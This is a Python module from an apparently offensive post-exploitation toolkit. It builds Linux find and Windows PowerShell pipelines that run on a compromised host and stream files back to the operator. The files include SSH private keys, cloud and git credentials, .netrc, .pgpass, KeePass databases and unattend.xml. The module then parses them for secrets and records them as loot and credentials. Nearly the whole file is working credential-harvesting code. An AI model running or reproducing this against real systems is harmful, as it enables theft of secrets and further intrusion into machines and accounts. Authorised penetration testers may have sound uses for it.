"""On-box filesystem scrub — the same secret-scrubbers as :mod:`sharespider`,
against files on a target the operator already owns.

The gap this closes: ``sharespider`` scrubs SMB shares (pre-foothold enumeration).
Once you have a foothold — the whole reason fieldkit exists — the same secrets live
in ``/etc/``, ``/opt/<app>/``, ``$HOME/.aws/`` on that box, and nothing was walking
those trees.

Design: reuse the pure :data:`sharespider.SCRUBBERS` (rule 1 — the scrubbers are
``(local_path, share_path, text) -> [Hit]``, no I/O), and drive them with output
captured through :func:`fieldkit.executor.execute`. One command per host: a
``find | while read; head; echo delimiter`` pipeline (Linux) or an equivalent
``Get-ChildItem`` PowerShell pipeline (Windows) that streams every candidate
file's contents, delimited so we can split them client-side. No files land on
disk on the attacker box — the parse happens in-memory.

Both OSes are handled here; the caller (`fieldkit scrub`) routes based on
``host['os']``. For a Windows foothold with SMB admin access to the same box,
``fieldkit spider`` is a complementary path — it goes through the SMB share
transport rather than a shell command.
"""
import re
from dataclasses import dataclass, field

from . import executor as executor_mod
from . import runner as runner_mod
from . import sharespider


DEFAULT_LINUX_PATHS = ("/etc", "/opt", "/root", "/home", "/var/www", "/srv")

#: Windows defaults chosen for "custom-app configs live here":
#:   * ProgramData / Users\Public — the traditional "shared config" dirs
#:   * inetpub — IIS web-app roots (web.config territory)
#:   * xampp / wamp roots — common LAMP-on-Windows footprints
#:   * ProgramFiles — application install roots (many bundle .config / .yml)
#: Windows / Windows\System32 are excluded intentionally (huge tree, mostly noise).
DEFAULT_WINDOWS_PATHS = (
    "C:\\ProgramData",
    "C:\\Users\\Public",
    "C:\\Users",
    "C:\\inetpub",
    "C:\\xampp",
    "C:\\wamp",
    "C:\\Program Files",
    "C:\\Program Files (x86)",
)

#: Extensions and filenames to sweep. Overlaps sharespider's `_INTERESTING` set for
#: filename-only hits (SSH keys, .env, credentials files) plus the config/script
#: extensions where scrub_kv and scrub_webconfig actually parse content.
_FIND_TESTS = (
    "-name '*.yaml' -o -name '*.yml' -o -name '*.ini' "
    "-o -name '*.conf' -o -name '*.config' -o -name '*.cnf' "
    "-o -name '*.env' -o -name '.env*' "
    "-o -name '*.properties' -o -name '*.json' -o -name '*.xml' "
    "-o -name '*.sh' -o -name '*.ps1' -o -name '*.py' -o -name '*.rb' "
    "-o -name 'authorized_keys' -o -name 'id_rsa' -o -name 'id_ed25519' "
    "-o -name 'id_ecdsa' -o -name '*.pem' -o -name '*.ppk' "
    "-o -name '.pgpass' -o -name '.netrc' "
    "-o -name '.git-credentials' -o -name 'credentials' "
    "-o -name '*.pfx' -o -name '*.p12'"
)

#: Windows equivalent — filename patterns for Get-ChildItem -Include.
#: Includes .config for web.config, .kdbx for KeePass, .rdg for RDP mgr.
_WIN_INCLUDES = (
    "*.yaml", "*.yml", "*.ini", "*.conf", "*.config", "*.cnf",
    "*.env", ".env*",
    "*.properties", "*.json", "*.xml",
    "*.ps1", "*.psm1", "*.psd1", "*.bat", "*.cmd", "*.vbs",
    "id_rsa", "id_ed25519", "id_ecdsa", "authorized_keys",
    "*.pem", "*.ppk", "*.pfx", "*.p12",
    ".git-credentials", ".netrc",
    "*.kdbx", "*.rdg", "web.config", "app.config",
    "unattend.xml", "sysprep.xml", "autounattend.xml",
    "Groups.xml", "Services.xml", "ScheduledTasks.xml",
)

_MAX_BYTES_PER_FILE = 50_000
_TIMEOUT = 300

_HDR = "==FK-FS==%s=="                # sentinel per file (path in the middle)
_TAIL = "==FK-FS/END=="


@dataclass
class FsScrubReport:
    host: str = None
    files_scrubbed: int = 0
    hits: list = field(default_factory=list)
    creds_promoted: int = 0
    aborted: str = None


def _build_command(paths, max_bytes):
    """Linux `find | while read; head; echo delimiter` pipeline that streams
    every candidate file with FK-FS delimiters.

    Uses ``head -c`` per file so a huge log does not blow the exec-transport buffer.
    ``-readable`` is a GNU find extension; a POSIX fallback (2>/dev/null) keeps the
    parse robust when a file is unreadable. ``-mount`` keeps us off NFS/procfs.
    """
    path_args = " ".join(f"'{p}'" for p in paths)
    return (
        f"find {path_args} -mount -type f -size -{max_bytes}c \\( {_FIND_TESTS} \\) "
        "2>/dev/null | "
        "while IFS= read -r f; do "
        f"  echo \"==FK-FS==$f==\"; "
        f"  head -c {max_bytes} \"$f\" 2>/dev/null; "
        f"  echo; echo \"{_TAIL}\"; "
        "done"
    )


def _build_command_windows(paths, max_bytes):
    """PowerShell equivalent of the Linux pipeline — same FK-FS delimiters so
    the same ``parse_stream``/``scrub_stream`` reads the output.

    Uses ``Get-ChildItem -Include`` for the filename filter,
    ``Where-Object {$_.Length -lt N}`` for the size cap, and
    ``Get-Content -Raw`` for the body. Errors on individual files are swallowed
    with ``-ErrorAction SilentlyContinue`` — a locked / permission-denied file
    doesn't stop the walk. Output is one-shot to stdout, no temp files.
    """
    # Quote paths as PowerShell single-quoted strings (single-quote escaped by doubling).
    def _q(s):
        return "'" + s.replace("'", "''") + "'"
    paths_ps = ",".join(_q(p) for p in paths)
    includes_ps = ",".join(f"'{inc}'" for inc in _WIN_INCLUDES)
    return (
        f"$paths=@({paths_ps}); "
        f"$inc=@({includes_ps}); "
        "foreach ($p in $paths) { "
        "  if (-not (Test-Path -LiteralPath $p)) { continue }; "
        "  Get-ChildItem -LiteralPath $p -Include $inc -Recurse -File "
        "    -ErrorAction SilentlyContinue "
        f"    | Where-Object {{ $_.Length -lt {max_bytes} }} "
        "    | ForEach-Object { "
        "        Write-Output (\"==FK-FS==\" + $_.FullName + \"==\"); "
        "        try { Get-Content -LiteralPath $_.FullName -Raw "
        "                -Encoding UTF8 -ErrorAction Stop } catch {}; "
        f"        Write-Output ''; Write-Output '{_TAIL}' "
        "    } "
        "}"
    )


_DELIM = re.compile(r"^==FK-FS==(.+?)==\s*$\n(.*?)\n==FK-FS/END==\s*$",
                    re.M | re.S)


def parse_stream(output):
    """Yield ``(remote_path, body)`` for every delimited chunk in the raw output.

    Pure — no I/O, no state. Broken chunks (missing tail, mid-write truncation)
    are skipped rather than raised: a real target might disconnect mid-stream and
    the operator wants what did come through, not an exception.
    """
    for m in _DELIM.finditer(output or ""):
        yield m.group(1).strip(), m.group(2)


def scrub_stream(output):
    """Run every scrubber over every chunk in ``output``, yielding :class:`Hit` rows.

    Pure over the (already captured) stream — the executor already ran the target
    command; this is what turns its output into loot.
    """
    for remote_path, body in parse_stream(output):
        # scrub_filename gets an empty body cheaply (it inspects the path only);
        # content scrubbers get the body and skip when it doesn't parse as text.
        for scrub in sharespider.SCRUBBERS:
            if scrub is sharespider.scrub_filename:
                yield from scrub(remote_path, remote_path, "")
            elif body:
                yield from scrub(remote_path, remote_path, body)


def fs_scrub(store, host, cred, *, paths=None, run=None, allow=("read-only",),
             timeout=_TIMEOUT, on_event=None):
    """Scrub a foothold's filesystem for cleartext secrets. OS auto-routes:
    Linux runs a `find | while read` pipeline over shell; Windows runs the
    PowerShell equivalent. Both stream FK-FS-delimited chunks that
    :func:`scrub_stream` picks up.

    Runs ONE shell command through :func:`fieldkit.executor.execute` (rule 2: no
    child spawn here; the executor's runner is injected all the way through),
    parses the delimited stream, folds every :class:`Hit` into loot, and promotes
    any credential hit into the store — same shape as ``sharespider``.
    """
    os_name = host["os"] or "linux"                   # unfingerprinted → assume linux
    if os_name == "windows":
        default_paths = DEFAULT_WINDOWS_PATHS
        command = _build_command_windows(paths or default_paths, _MAX_BYTES_PER_FILE)
        shell = "powershell"
    elif os_name == "linux":
        default_paths = DEFAULT_LINUX_PATHS
        command = _build_command(paths or default_paths, _MAX_BYTES_PER_FILE)
        shell = "sh"
    else:
        return FsScrubReport(
            host=host["ip"],
            aborted=f"{host['ip']} is {os_name} — on-box scrub supports linux + "
                    "windows (mac/other unsupported).")
    paths = tuple(paths) if paths else default_paths
    _ = paths     # keep the value visible for future callers
    rep = FsScrubReport(host=host["ip"])
    emit = on_event or (lambda _m: None)

    action = executor_mod.Action(
        host=host, cred=cred, command=command,
        label="fs-scrub", safety="read-only", shell=shell)
    res = executor_mod.execute(
        store, action, allow=list(allow), timeout=timeout,
        run=run or (lambda argv, env=None: runner_mod.run(argv, env_add=env,
                                                          timeout=timeout)),
        on_event=emit)
    if res.blocked:
        rep.aborted = res.blocked
        return rep
    if res.run is not None and res.run.error:
        rep.aborted = res.run.error
        return rep

    with store.transaction():
        for hit in scrub_stream(res.output or ""):
            rep.files_scrubbed += 1
            rep.hits.append(hit)
            store.add_step(
                cmd=f"scrub:{hit.kind}",
                output=f"{hit.share_path} — {hit.snippet}",
                exit_code=0, host_id=host["id"],
                label=f"fs-scrub:{hit.kind}")
            store.add_loot(host["id"], f"fs-scrub:{hit.kind}",
                           value=hit.share_path, path=None)
            if hit.credential:
                _, created = store.add_credential(hit.credential,
                                                  source=f"fs-scrub:{hit.kind}")
                rep.creds_promoted += 1 if created else 0

    emit(f"  fs-scrub {host['ip']}: {rep.files_scrubbed} hit(s), "
         f"{rep.creds_promoted} credential(s) promoted")
    return rep
